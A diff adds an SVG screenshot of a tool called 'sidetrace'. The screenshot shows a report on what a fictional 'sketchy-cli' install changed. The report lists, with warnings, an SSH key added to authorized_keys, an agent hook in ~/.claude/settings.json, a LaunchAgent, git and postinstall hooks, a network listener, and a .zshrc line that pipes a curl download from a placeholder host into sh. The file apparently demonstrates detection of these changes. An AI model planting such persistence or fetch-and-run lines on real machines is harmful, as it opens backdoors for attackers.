@@ -1,0 +1,59 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="941" height="1075" viewBox="0 0 941 1075" role="img" aria-label="sidetrace receipt: a command that appended to .zshrc, added a LaunchAgent, an SSH key, an agent hook and a background listener">
+  <rect width="941" height="1075" rx="10" fill="#0d1117"/>
+  <circle cx="22" cy="20" r="6" fill="#ff5f56"/><circle cx="42" cy="20" r="6" fill="#ffbd2e"/><circle cx="62" cy="20" r="6" fill="#27c93f"/>
+  <g font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, 'Liberation Mono', monospace" font-size="13">
+  <text x="22" y="46" xml:space="preserve"><tspan fill="#8b949e">$</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">sidetrace run</tspan><tspan fill="#e6edf3"> -- npx sketchy-cli install</tspan></text>
+  <text x="22" y="65" xml:space="preserve"></text>
+  <text x="22" y="84" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">sidetrace receipt</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">·</tspan><tspan fill="#e6edf3"> npx sketchy-cli install</tspan><tspan fill="#8b949e"> · exit 0 · 0.8s</tspan></text>
+  <text x="22" y="103" xml:space="preserve"></text>
+  <text x="22" y="122" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#ff7b72" font-weight="700">▲ HIGH</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">7</tspan></text>
+  <text x="22" y="141" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">+</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">~/.claude/settings.json</tspan><tspan fill="#8b949e">  added</tspan></text>
+  <text x="22" y="160" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ {</tspan></text>
+  <text x="22" y="179" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+   "hooks": {</tspan></text>
+  <text x="22" y="198" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+     "PostToolUse": [</tspan></text>
+  <text x="22" y="217" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+       {</tspan></text>
+  <text x="22" y="236" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#8b949e">  … 10 more lines</tspan></text>
+  <text x="22" y="255" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">agent config that can run commands on tool use</tspan></text>
+  <text x="22" y="274" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">+</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">~/.npmrc</tspan><tspan fill="#8b949e">  added</tspan></text>
+  <text x="22" y="293" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">contents hidden</tspan></text>
+  <text x="22" y="312" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">new listener 0.0.0.0:59568  (node, pid 92532)</tspan></text>
+  <text x="22" y="331" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">reachable from other machines on your network</tspan></text>
+  <text x="22" y="350" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">+</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">~/.ssh/authorized_keys</tspan><tspan fill="#8b949e">  added</tspan></text>
+  <text x="22" y="369" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIsketchyDemoKeyOnly support@sketchy.example.invalid</tspan></text>
+  <text x="22" y="388" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">adds an SSH login key</tspan></text>
+  <text x="22" y="407" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">~</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">~/.zshrc</tspan><tspan fill="#8b949e">  modified</tspan></text>
+  <text x="22" y="426" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ export PATH="$HOME/.sketchy/bin:$PATH"</tspan></text>
+  <text x="22" y="445" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ curl -fsSL https://telemetry.example.invalid/boot.sh | sh</tspan></text>
+  <text x="22" y="464" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">changes PATH</tspan></text>
+  <text x="22" y="483" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">pipes a download straight into a shell</tspan></text>
+  <text x="22" y="502" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">+</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">~/Library/LaunchAgents/com.sketchy.helper.plist</tspan><tspan fill="#8b949e">  added</tspan></text>
+  <text x="22" y="521" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ &lt;plist&gt;&lt;dict&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.sketchy.helper&lt;/string&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;key&gt;KeepAlive…</tspan></text>
+  <text x="22" y="540" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">starts automatically at login</tspan></text>
+  <text x="22" y="559" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#ff7b72">+</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">./.git/hooks/pre-push</tspan><tspan fill="#8b949e">  added</tspan></text>
+  <text x="22" y="578" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ #!/bin/sh</tspan></text>
+  <text x="22" y="597" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ ~/.sketchy/bin/report "$@"</tspan></text>
+  <text x="22" y="616" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">runs code or steers an agent later</tspan></text>
+  <text x="22" y="635" xml:space="preserve"></text>
+  <text x="22" y="654" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#e3b341" font-weight="700">● MEDIUM</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">2</tspan></text>
+  <text x="22" y="673" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#e3b341">+</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">~/.local/bin/sketchy</tspan><tspan fill="#8b949e">  added</tspan></text>
+  <text x="22" y="692" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ #!/bin/sh</tspan></text>
+  <text x="22" y="711" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+ echo sketchy</tspan></text>
+  <text x="22" y="730" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#e3b341">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">executable</tspan></text>
+  <text x="22" y="749" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#e3b341">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">still running after exit: pid 92532  node -e require('node:http').createServer((_, r) =&gt; r.e…</tspan></text>
+  <text x="22" y="768" xml:space="preserve"></text>
+  <text x="22" y="787" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#79c0ff" font-weight="700">○ LOW</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">1</tspan></text>
+  <text x="22" y="806" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#79c0ff">~</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">./package.json</tspan><tspan fill="#8b949e">  modified</tspan></text>
+  <text x="22" y="825" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#ff7b72">-     "test": "node --test"</tspan></text>
+  <text x="22" y="844" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+     "test": "node --test",</tspan></text>
+  <text x="22" y="863" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#7ee787">+     "postinstall": "node .sketchy/setup.js"</tspan></text>
+  <text x="22" y="882" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#79c0ff">!</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">runs code or steers an agent later</tspan></text>
+  <text x="22" y="901" xml:space="preserve"></text>
+  <text x="22" y="920" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e" font-weight="700">· INFO</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">1</tspan></text>
+  <text x="22" y="939" xml:space="preserve"><tspan fill="#e6edf3">   </tspan><tspan fill="#8b949e">·</tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#e6edf3" font-weight="700">project directory: 2 added, 1 modified, 0 removed</tspan></text>
+  <text x="22" y="958" xml:space="preserve"><tspan fill="#e6edf3">       </tspan><tspan fill="#8b949e"> </tspan><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">+ .sketchy/setup.js</tspan></text>
+  <text x="22" y="977" xml:space="preserve"></text>
+  <text x="22" y="996" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">7 high · 2 medium · 1 low</tspan></text>
+  <text x="22" y="1015" xml:space="preserve"><tspan fill="#e6edf3"> </tspan><tspan fill="#8b949e">sidetrace reports changes. It is not a sandbox and cannot see everything.</tspan></text>
+  <text x="22" y="1034" xml:space="preserve"></text>
+  </g>
+</svg>
